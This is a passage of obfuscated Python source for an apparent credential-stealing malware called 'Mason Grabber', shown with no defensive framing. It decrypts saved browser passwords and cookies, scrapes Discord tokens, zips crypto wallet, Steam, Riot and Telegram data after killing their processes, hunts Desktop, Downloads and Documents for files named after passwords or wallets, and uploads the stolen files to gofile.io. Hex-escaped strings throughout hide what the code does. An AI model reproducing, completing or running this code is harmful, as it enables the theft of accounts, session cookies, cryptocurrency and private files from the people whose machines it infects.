    path = os.getenv("\x54\x45\x4d\x50") + f"\wp{name}\x2e\x74\x78\x74"
    with open(path, mode="\x77", encoding="\x75\x74\x66\x2d\x38") as f:
        f.write(f"\x45\x7a\x7a\x7a\x7a\x7a\x7a\x7a\x7a\n\n")
        for line in data:
            if line[0] != "":
                f.write(f"{line}\n")


Tokens = ""


def getToken(path, arg):
    if not os.path.exists(path):
        return

    path += arg
    for file in os.listdir(path):
        if file.endswith("\x2e\x6c\x6f\x67") or file.endswith("\x2e\x6c\x64\x62"):
            for line in [
                    x.strip() for x in open(f"{path}\\{file}",
                                            errors="\x69\x67\x6e\x6f\x72\x65").readlines()
                    if x.strip()
            ]:
                for regex in (
                        r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",
                        r"mfa\.[\w-]{80,95}",
                ):
                    for token in re.findall(regex, line):
                        global Tokens
                        if checkToken(token):
                            if not token in Tokens:
                                Tokens += token
                                uploadToken(token, path)


Passw = []


def getPassw(path, arg):
    global Passw, PasswCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "\x2f\x4c\x6f\x67\x69\x6e\x20\x44\x61\x74\x61"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "wp" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + "\x2e\x64\x62")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute(
        "\x53\x45\x4c\x45\x43\x54\x20\x61\x63\x74\x69\x6f\x6e\x5f\x75\x72\x6c\x2c\x20\x75\x73\x65\x72\x6e\x61\x6d\x65\x5f\x76\x61\x6c\x75\x65\x2c\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x5f\x76\x61\x6c\x75\x65\x20\x46\x52\x4f\x4d\x20\x6c\x6f\x67\x69\x6e\x73\x3b")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x61\x74\x65"
    with open(pathKey, "\x72", encoding="\x75\x74\x66\x2d\x38") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["\x6f\x73\x5f\x63\x72\x79\x70\x74"]["\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x6b\x65\x79"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "\x68\x74\x74\x70\x73" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in paswWords:
                        paswWords.append(old)
            Passw.append(
                f"\x55\x52\x6c\x3a {row[0]}|\x75\x73\x65\x72\x3a {row[1]}|\x70\x61\x73\x73\x3a {DecryptValue(row[2], master_key)}"
            )
            PasswCount += 1
    writeforfile(Passw, "\x70\x61\x73\x73")


Cookies = []


def getCookie(path, arg):
    global Cookies, CookiCount
    if not os.path.exists(path):
        return

    pathC = path + arg + "\x2f\x43\x6f\x6f\x6b\x69\x65\x73"
    if os.stat(pathC).st_size == 0:
        return

    tempfold = (
        temp + "\x77\x70" +
        "".join(random.choice("bcdefghijklmnopqrstuvwxyz")
                for i in range(8)) + "\x2e\x64\x62")

    shutil.copy2(pathC, tempfold)
    conn = sql_connect(tempfold)
    cursor = conn.cursor()
    cursor.execute("\x53\x45\x4c\x45\x43\x54\x20\x68\x6f\x73\x74\x5f\x6b\x65\x79\x2c\x20\x6e\x61\x6d\x65\x2c\x20\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x76\x61\x6c\x75\x65\x20\x46\x52\x4f\x4d\x20\x63\x6f\x6f\x6b\x69\x65\x73")
    data = cursor.fetchall()
    cursor.close()
    conn.close()
    os.remove(tempfold)

    pathKey = path + "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x61\x74\x65"

    with open(pathKey, "\x72", encoding="\x75\x74\x66\x2d\x38") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["\x6f\x73\x5f\x63\x72\x79\x70\x74"]["\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x6b\x65\x79"])
    master_key = CryptUnprotectData(master_key[5:])

    for row in data:
        if row[0] != "":
            for wa in keyword:
                old = wa
                if "\x68\x74\x74\x70\x73" in wa:
                    tmp = wa
                    wa = tmp.split("[")[1].split("]")[0]
                if wa in row[0]:
                    if not old in cookiWords:
                        cookiWords.append(old)
            Cookies.append(
                f"{row[0]} {row[1]}{DecryptValue(row[2], master_key)}"
            )
            CookiCount += 1
    writeforfile(Cookies, "\x63\x6f\x6f\x6b")


def GetDiscord(path, arg):
    if not os.path.exists(f"{path}\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x61\x74\x65"):
        return

    pathC = path + arg

    pathKey = path + "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x61\x74\x65"
    with open(pathKey, "\x72", encoding="\x75\x74\x66\x2d\x38") as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state["\x6f\x73\x5f\x63\x72\x79\x70\x74"]["\x65\x6e\x63\x72\x79\x70\x74\x65\x64\x5f\x6b\x65\x79"])
    master_key = CryptUnprotectData(master_key[5:])

    for file in os.listdir(pathC):
        if file.endswith("\x2e\x6c\x6f\x67") or file.endswith("\x2e\x6c\x64\x62"):
            for line in [
                    x.strip() for x in open(f"{pathC}\\{file}",
                                            errors="\x69\x67\x6e\x6f\x72\x65").readlines()
                    if x.strip()
            ]:
                for token in re.findall(
                        r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokenDecoded = DecryptValue(
                        b64decode(token.split("dQw4w9WgXcQ:")[1]), master_key)
                    if checkToken(tokenDecoded):
                        if not tokenDecoded in Tokens:
                            Tokens += tokenDecoded
                            uploadToken(tokenDecoded, path)


def GatherZips(paths1, paths2, paths3):
    thttht = []
    for patt in paths1:
        a = threading.Thread(target=ZipThings,
                             args=[patt[0], patt[5], patt[1]])
        a.start()
        thttht.append(a)

    for patt in paths2:
        a = threading.Thread(target=ZipThings,
                             args=[patt[0], patt[2], patt[1]])
        a.start()
        thttht.append(a)

    a = threading.Thread(target=ZipTelegram,
                         args=[paths3[0], paths3[2], paths3[1]])
    a.start()
    thttht.append(a)

    for thread in thttht:
        thread.join()
    global WalletsZip, GamingZip, OtherZip

    wal, ga, ot = "", "", ""
    if not len(WalletsZip) == 0:
        wal = "\x3a\x63\x6f\x69\x6e\x20\x57\x61\x6c\x6c\x65\x74\x73\n"
        for i in WalletsZip:
            wal += f"└─ [{i[0]}]({i[1]})\n"
    if not len(WalletsZip) == 0:
        ga = "\x3a\x76\x69\x64\x65\x6f\x5f\x67\x61\x6d\x65\x20\x47\x61\x6d\x69\x6e\x67\x3a\n"
        for i in GamingZip:
            ga += f"└─ [{i[0]}]({i[1]})\n"
    if not len(OtherZip) == 0:
        ot = "\x3a\x74\x69\x63\x6b\x65\x74\x73\x20\x41\x70\x70\x73\n"
        for i in OtherZip:
            ot += f"└─ [{i[0]}]({i[1]})\n"
    headers = {
        "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65":
        "\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x73\x6f\x6e",
        "\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74":
        "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30\x3b\x20\x57\x69\x6e\x36\x34\x3b\x20\x78\x36\x34\x3b\x20\x72\x76\x3a\x31\x30\x32\x2e\x30\x29\x20\x47\x65\x63\x6b\x6f\x2f\x32\x30\x31\x30\x30\x31\x30\x31\x20\x46\x69\x72\x65\x66\x6f\x78\x2f\x31\x30\x32\x2e\x30",
    }


    data = {
        "\x63\x6f\x6e\x74\x65\x6e\x74":
        "",
        "\x65\x6d\x62\x65\x64\x73": [{
            "\x74\x69\x74\x6c\x65": "\x4d\x61\x73\x6f\x6e\x20\x20\x2d\x20\x20\x5a\x69\x70\x73",
            "\x64\x65\x73\x63\x72\x69\x70\x74\x69\x6f\x6e": f"{wal}\n{ga}\n{ot}",
            "\x63\x6f\x6c\x6f\x72": 0,
            "\x66\x6f\x6f\x74\x65\x72": {
                "\x74\x65\x78\x74": "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x40\x47\x72\x77\x62",
                "\x69\x63\x6f\x6e\x5f\x75\x72\x6c": "",
            },
        }],
        "\x75\x73\x65\x72\x6e\x61\x6d\x65":
        "\x4d\x61\x73\x6f\x6e\x20\x47\x72\x61\x62\x62\x65\x72",
        "\x61\x76\x61\x74\x61\x72\x5f\x75\x72\x6c":
        "",
        "\x61\x74\x74\x61\x63\x68\x6d\x65\x6e\x74\x73": [],
    }


def ZipTelegram(path, arg, procc):
    global OtherZip
    pathC = path
    name = arg
    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"\x74\x61\x73\x6b\x6b\x69\x6c\x6c /im {procc} \x2f\x74\x20\x2f\x66\x20\x3e\x6e\x75\x6c\x20\x32\x3e\x26\x31", shell=True)

    zf = ZipFile(f"{pathC}/{name}\x2e\x7a\x69\x70", "\x77")
    for file in os.listdir(pathC):
        if (not "\x2e\x7a\x69\x70" in file and not "\x74\x64\x75\x6d\x6d\x79" in file
                and not "\x75\x73\x65\x72\x5f\x64\x61\x74\x61" in file and not "\x77\x65\x62\x76\x69\x65\x77" in file):
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = "https://\x67\x6f\x6f\x67\x6c\x65.com"
    os.remove(f"{pathC}/{name}.zip")
    OtherZip.append([arg, lnik])


def ZipThings(path, arg, procc):
    pathC = path
    name = arg
    global WalletsZip, GamingZip, OtherZip

    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"\x4d\x65\x74\x61\x6d\x61\x73\x6b\x5f{browser}"
        pathC = path + arg

    if not os.path.exists(pathC):
        return
    subprocess.Popen(f"\x74\x61\x73\x6b\x6b\x69\x6c\x6c /im {procc} \x2f\x74\x20\x2f\x66\x20\x3e\x6e\x75\x6c\x20\x32\x3e\x26\x31", shell=True)

    if "\x57\x61\x6c\x6c\x65\x74" in arg or "\x4e\x61\x74\x69\x6f\x6e\x73\x47\x6c\x6f\x72\x79" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"

    elif "\x53\x74\x65\x61\x6d" in arg:
        if not os.path.isfile(f"{pathC}\x2f\x6c\x6f\x67\x69\x6e\x75\x73\x65\x72\x73\x2e\x76\x64\x66"):
            return
        f = open(f"{pathC}\x2f\x6c\x6f\x67\x69\x6e\x75\x73\x65\x72\x73\x2e\x76\x64\x66", "\x72\x2b", encoding="\x75\x74\x66\x38")
        data = f.readlines()
        found = False
        for l in data:
            if '\x52\x65\x6d\x65\x6d\x62\x65\x72\x50\x61\x73\x73\x77\x6f\x72\x64"\t\t"1"' in l:
                found = True
        if found == False:
            return
        name = arg

    zf = ZipFile(f"{pathC}/{name}\x2e\x7a\x69\x70", "\x77")
    for file in os.listdir(pathC):
        if not "\x2e\x7a\x69\x70" in file:
            zf.write(pathC + "/" + file)
    zf.close()

    lnik = "https://\x67\x6f\x6f\x67\x6c\x65.com"
    os.remove(f"{pathC}/{name}\x2e\x7a\x69\x70")

    if "\x57\x61\x6c\x6c\x65\x74" in arg or "\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66" in arg:
        WalletsZip.append([name, lnik])
    elif "\x4e\x61\x74\x69\x6f\x6e\x73\x47\x6c\x6f\x72\x79" in name or "\x53\x74\x65\x61\x6d" in name or "\x52\x69\x6f\x74\x43\x6c\x69" in name:
        GamingZip.append([name, lnik])
    else:
        OtherZip.append([name, lnik])


def GatherAll():
    "\x44\x65\x66\x61\x75\x6c\x74\x20\x50\x61\x74\x68\x20\x3c\x20\x30\x20\x3e                         \x50\x72\x6f\x63\x65\x73\x4e\x61\x6d\x65\x20\x3c\x20\x31\x20\x3e        \x54\x6f\x6b\x65\x6e\x20\x20\x3c\x20\x32\x20\x3e              \x50\x61\x73\x73\x77\x6f\x72\x64\x20\x3c\x20\x33\x20\x3e     \x43\x6f\x6f\x6b\x69\x65\x73\x20\x3c\x20\x34\x20\x3e                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}\x2f\x4f\x70\x65\x72\x61\x20\x53\x6f\x66\x74\x77\x61\x72\x65\x2f\x4f\x70\x65\x72\x61\x20\x47\x58\x20\x53\x74\x61\x62\x6c\x65",
            "\x6f\x70\x65\x72\x61\x2e\x65\x78\x65",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "/",
            "\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{roaming}\x2f\x4f\x70\x65\x72\x61\x20\x53\x6f\x66\x74\x77\x61\x72\x65\x2f\x4f\x70\x65\x72\x61\x20\x53\x74\x61\x62\x6c\x65",
            "\x6f\x70\x65\x72\x61\x2e\x65\x78\x65",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "/",
            "\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{roaming}\x2f\x4f\x70\x65\x72\x61\x20\x53\x6f\x66\x74\x77\x61\x72\x65\x2f\x4f\x70\x65\x72\x61\x20\x4e\x65\x6f\x6e\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x6f\x70\x65\x72\x61\x2e\x65\x78\x65",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "/",
            "\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{local}\x2f\x47\x6f\x6f\x67\x6c\x65\x2f\x43\x68\x72\x6f\x6d\x65\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61",
            "\x63\x68\x72\x6f\x6d\x65\x2e\x65\x78\x65",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{local}\x2f\x47\x6f\x6f\x67\x6c\x65\x2f\x43\x68\x72\x6f\x6d\x65\x20\x53\x78\x53\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61",
            "\x63\x68\x72\x6f\x6d\x65\x2e\x65\x78\x65",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{local}\x2f\x42\x72\x61\x76\x65\x53\x6f\x66\x74\x77\x61\x72\x65\x2f\x42\x72\x61\x76\x65\x2d\x42\x72\x6f\x77\x73\x65\x72\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61",
            "\x62\x72\x61\x76\x65\x2e\x65\x78\x65",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{local}\x2f\x59\x61\x6e\x64\x65\x78\x2f\x59\x61\x6e\x64\x65\x78\x42\x72\x6f\x77\x73\x65\x72\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61",
            "\x79\x61\x6e\x64\x65\x78\x2e\x65\x78\x65",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x48\x6f\x75\x67\x61\x42\x6f\x75\x67\x61\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
        [
            f"{local}\x2f\x4d\x69\x63\x72\x6f\x73\x6f\x66\x74\x2f\x45\x64\x67\x65\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61",
            "\x65\x64\x67\x65\x2e\x65\x78\x65",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4e\x65\x74\x77\x6f\x72\x6b",
            "\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x4c\x6f\x63\x61\x6c\x20\x45\x78\x74\x65\x6e\x73\x69\x6f\x6e\x20\x53\x65\x74\x74\x69\x6e\x67\x73\x2f\x6e\x6b\x62\x69\x68\x66\x62\x65\x6f\x67\x61\x65\x61\x6f\x65\x68\x6c\x65\x66\x6e\x6b\x6f\x64\x62\x65\x66\x67\x70\x67\x6b\x6e\x6e",
        ],
    ]

    discordPaths = [
        [f"{roaming}\x2f\x44\x69\x73\x63\x6f\x72\x64", "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62"],
        [f"{roaming}\x2f\x4c\x69\x67\x68\x74\x63\x6f\x72\x64", "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62"],
        [f"{roaming}\x2f\x64\x69\x73\x63\x6f\x72\x64\x63\x61\x6e\x61\x72\x79", "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62"],
        [f"{roaming}\x2f\x64\x69\x73\x63\x6f\x72\x64\x70\x74\x62", "\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62"],
    ]

    PathsToZip = [
        [
            f"{roaming}\x2f\x61\x74\x6f\x6d\x69\x63\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62", '"\x41\x74\x6f\x6d\x69\x63\x20\x57\x61\x6c\x6c\x65\x74\x2e\x65\x78\x65"',
            "\x57\x61\x6c\x6c\x65\x74"
        ],
        [f"{roaming}\x2f\x45\x78\x6f\x64\x75\x73\x2f\x65\x78\x6f\x64\x75\x73\x2e\x77\x61\x6c\x6c\x65\x74", "\x45\x78\x6f\x64\x75\x73\x2e\x65\x78\x65", "\x57\x61\x6c\x6c\x65\x74"],
        ["\x43\x3a\x5c\x50\x72\x6f\x67\x72\x61\x6d\x20\x46\x69\x6c\x65\x73\x20\x28\x78\x38\x36\x29\x5c\x53\x74\x65\x61\x6d\x5c\x63\x6f\x6e\x66\x69\x67", "\x73\x74\x65\x61\x6d\x2e\x65\x78\x65", "\x53\x74\x65\x61\x6d"],
        [
            f"{roaming}\x2f\x4e\x61\x74\x69\x6f\x6e\x73\x47\x6c\x6f\x72\x79\x2f\x4c\x6f\x63\x61\x6c\x20\x53\x74\x6f\x72\x61\x67\x65\x2f\x6c\x65\x76\x65\x6c\x64\x62",
            "\x4e\x61\x74\x69\x6f\x6e\x73\x47\x6c\x6f\x72\x79\x2e\x65\x78\x65",
            "\x4e\x61\x74\x69\x6f\x6e\x73\x47\x6c\x6f\x72\x79",
        ],
        [
            f"{local}\x2f\x52\x69\x6f\x74\x20\x47\x61\x6d\x65\x73\x2f\x52\x69\x6f\x74\x20\x43\x6c\x69\x65\x6e\x74\x2f\x44\x61\x74\x61",
            "\x52\x69\x6f\x74\x43\x6c\x69\x65\x6e\x74\x53\x65\x72\x76\x69\x63\x65\x73\x2e\x65\x78\x65",
            "\x52\x69\x6f\x74\x43\x6c\x69\x65\x6e\x74",
        ],
    ]
    Telegram = [
        f"{roaming}\x2f\x54\x65\x6c\x65\x67\x72\x61\x6d\x20\x44\x65\x73\x6b\x74\x6f\x70\x2f\x74\x64\x61\x74\x61", "\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x65\x78\x65", "\x54\x65\x6c\x65\x67\x72\x61\x6d"
    ]

    for patt in browserPaths:
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

    for patt in browserPaths:
        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
        a.start()
        Threadlist.append(a)

    ThCokk = []
    for patt in browserPaths:
        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
        a.start()
        ThCokk.append(a)

    threading.Thread(target=GatherZips,
                     args=[browserPaths, PathsToZip, Telegram]).start()

    for thread in ThCokk:
        thread.join()
    DETECTED = Trust(Cookies)
    if DETECTED == True:
        return

    for thread in Threadlist:
        thread.join()
    global upths
    upths = []

    for file in ["\x77\x70\x70\x61\x73\x73\x77\x2e\x74\x78\x74", "\x77\x70\x63\x6f\x6f\x6b\x2e\x74\x78\x74"]:
        upload(file.replace("\x2e\x74\x78\x74", ""),
               uploadToAnonfiles(os.getenv("\x54\x45\x4d\x50") + "\\" + file))


def uploadToAnonfiles(path):
    try:
        return requests.post(
            f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',
            files={
                "\x66\x69\x6c\x65": open(path, "\x72\x62")
            },
        ).json()["\x64\x61\x74\x61"]["\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x50\x61\x67\x65"]
    except:
        return False

def KiwiFolder(pathF, keywords):
    global KiwiFiles
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = uploadToAnonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    KiwiFiles.append(["\x66\x6f\x6c\x64\x65\x72", pathF + "/", ffound])


KiwiFiles = []


def KiwiFile(path, keywords):
    global KiwiFiles
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and "\x2e\x74\x78\x74" in file:
                    fifound.append([
                        path + "/" + file,
                        uploadToAnonfiles(path + "/" + file)
                    ])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["\x66\x6f\x6c\x64\x65\x72", path, fifound])


def Kiwi():
    user = temp.split("\x5c\x41\x70\x70\x44\x61\x74\x61")[0]
    path2search = [
        user + "\x5c\x5c\x44\x65\x73\x6b\x74\x6f\x70", user + "\x5c\x5c\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x73", user + "\x5c\x5c\x44\x6f\x63\x75\x6d\x65\x6e\x74\x73"
    ]

    key_wordsFolder = ["\x61\x63\x63\x6f\x75\x6e\x74", "\x61\x63\x6f\x75\x6e\x74", "\x70\x61\x73\x73\x77", "\x73\x65\x63\x72\x65\x74"]

    key_wordsFiles = [
        "\x70\x61\x73\x73\x77",
        "\x6d\x64\x70",
        "\x6d\x6f\x74\x64\x65\x70\x61\x73\x73\x65",
        "\x6d\x6f\x74\x5f\x64\x65\x5f\x70\x61\x73\x73\x65",
        "\x6c\x6f\x67\x69\x6e",
        "\x73\x65\x63\x72\x65\x74",
        "\x61\x63\x63\x6f\x75\x6e\x74",
        "\x61\x63\x6f\x75\x6e\x74",
        "\x70\x61\x79\x70\x61\x6c",
        "\x62\x61\x6e\x71\x75\x65",
        "\x61\x63\x63\x6f\x75\x6e\x74",
        "\x6d\x65\x74\x61\x6d\x61\x73\x6b",
        "\x77\x61\x6c\x6c\x65\x74",
        "\x63\x72\x79\x70\x74\x6f",
        "\x65\x78\x6f\x64\x75\x73",
        "\x64\x69\x73\x63\x6f\x72\x64",
        "\x32\x66\x61",
        "\x63\x6f\x64\x65",
        "\x6d\x65\x6d\x6f",
        "\x63\x6f\x6d\x70\x74\x65",
        "\x74\x6f\x6b\x65\x6e",
        "\x62\x61\x63\x6b\x75\x70",
        "\x73\x65\x63\x72\x65\x74",
    ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    "\x6d\x61\x69\x6c",
    "\x5b\x63\x6f\x69\x6e\x62\x61\x73\x65\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x6f\x69\x6e\x62\x61\x73\x65\x2e\x63\x6f\x6d\x29",
    "\x5b\x73\x65\x6c\x6c\x69\x78\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6c\x6c\x69\x78\x2e\x69\x6f\x29",
    "\x5b\x67\x6d\x61\x69\x6c\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x29",
    "\x5b\x73\x74\x65\x61\x6d\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x74\x65\x61\x6d\x2e\x63\x6f\x6d\x29",
    "\x5b\x64\x69\x73\x63\x6f\x72\x64\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x29",
    "\x5b\x72\x69\x6f\x74\x67\x61\x6d\x65\x73\x5d\x28\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x69\x6f\x74\x67\x61\x6d\x65\x73\x2e\x63\x6f\x6d\x29",
